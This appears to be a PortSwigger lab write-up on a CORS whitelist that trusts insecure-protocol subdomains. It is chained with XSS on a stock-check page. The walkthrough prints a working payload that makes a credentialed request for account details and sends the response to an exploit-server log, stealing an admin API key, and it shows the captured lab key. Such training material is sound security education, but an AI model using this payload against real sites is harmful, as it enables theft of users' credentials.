![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/f8048c24-4829-49f9-a33b-099e109022d8)

### Solution

When we give Origin: hacked.com or Origin: null , we don't see any ACAO header in the response.

But when we give Origin : "http://subdomain.lab-domain.com" we get the Access-Control-Allow-Origin in the response. [Note that we gave http instead of https]

So if we provide subdoamin of the website along with http insecure protocol, we are able to bypass the whitelist.

another way around to steal Administrator's API keys is by exploiting an XSS vulnearbility.

When we click on checkstock, we are taken to a new tab to display the result.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/0ffd5841-b099-4a1c-9fac-36e95fed4983)

payload 

```js
<script>
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

Deliver the exploit to victim & view AccessLog , there we will find the API key of admin in the URL portion.

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/57ea5c9b-8e57-4dfc-b613-e76f66585c5b)

api key is `aN2CHsugpO4PiEhwqJkZ7S8M6UglwYEw`

submit the solution and lab is solved

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/64c8b426-754a-4c55-8123-ed51723b66f4)

